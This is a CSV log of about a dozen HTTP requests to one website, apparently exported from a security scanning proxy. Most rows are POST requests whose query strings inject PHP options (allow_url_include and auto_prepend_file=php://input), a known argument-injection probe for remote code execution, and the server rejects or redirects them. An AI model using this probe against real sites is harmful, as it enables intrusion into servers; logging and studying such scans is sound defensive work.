ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
208,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,POST,https://amarsolution.xyz/assets?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,301,Moved Permanently,75,489,178
209,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,POST,https://amarsolution.xyz/assets/index-e46c8535.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,Not Allowed,75,166,568
210,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,POST,https://amarsolution.xyz/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,Not Allowed,88,379,568
211,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,POST,https://amarsolution.xyz/assets/login-beeda917.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,Not Allowed,199,166,568
212,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,GET,https://amarsolution.xyz/backend,200,OK,204,460,524
213,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,GET,https://amarsolution.xyz/backend/main,301,Moved Permanently,61,435,178
214,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,POST,https://amarsolution.xyz/assets/login-beeda917.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,Not Allowed,62,166,568
215,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,POST,https://amarsolution.xyz/assets/index-f776b6eb.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,Not Allowed,274,166,568
216,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,POST,https://amarsolution.xyz/backend?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,Not Allowed,66,379,568
217,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,POST,https://amarsolution.xyz/backend/main?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,301,Moved Permanently,59,495,178
218,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,POST,https://amarsolution.xyz/backend?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,Not Allowed,62,379,568
219,Mon Feb 02 16:07:55 GMT+06:00 2026,Mon Feb 02 16:07:55 GMT+06:00 2026,POST,https://amarsolution.xyz/assets/index-f776b6eb.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,Not Allowed,69,166,568
